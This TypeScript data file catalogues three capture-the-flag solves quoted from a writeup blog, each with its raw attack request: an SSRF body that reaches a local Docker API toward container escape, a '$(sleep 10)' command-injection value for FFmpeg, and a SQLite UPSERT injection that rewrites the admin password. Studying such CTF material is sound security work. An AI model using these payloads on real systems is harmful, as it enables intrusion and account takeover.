/** Verbatim requests from blog.achux.xyz writeups. Do not paraphrase the payload. */
export type CaseFile = {
  event: string;
  title: string;
  href: string;
  request: string;
  reached: string;
};

export const cases: CaseFile[] = [
  {
    event: 'PearlCTF 2025',
    title: 'SSRF to Docker socket → container escape',
    href: 'https://blog.achux.xyz/posts/pearlctf/',
    request: `POST / HTTP/1.1
Host: tic-tac-toe-2be65176aac79f13.ctf.pearlctf.in
Content-Type: application/json

{ "state": "_________", "api": {"http://": "http://127.0.0.1:2375/info#"}, "action": "get" }`,
    reached:
      'That body is the writeup’s first request. It reaches the Docker API on 127.0.0.1:2375 and returns daemon info, including the container id used for the escape.',
  },
  {
    event: 'UofTCTF 2024',
    title: 'FFmpeg command injection & web cache deception',
    href: 'https://blog.achux.xyz/posts/uoftctf/',
    request: '$(sleep 10)',
    reached:
      'The writeup places this in the FFmpeg command on Voice Changer. The response is delayed by 10 seconds.',
  },
  {
    event: 'USC-CTF 2024',
    title: 'SQLite3 injection via UPSERT',
    href: 'https://blog.achux.xyz/posts/usc-spookyql/',
    request: `POST /register HTTP/1.1
Host: usc-spookyql.chals.io
Content-Type: application/x-www-form-urlencoded

username=admin', 'meow') ON CONFLICT(username) DO UPDATE SET password = 'achuxer';--&password=password`,
    reached:
      'The username is the payload the writeup shows for /register. The UPSERT rewrites the admin password. The posted solve hashes that password before it is stored, then logs in and reads the flag from /dashboard.',
  },
];
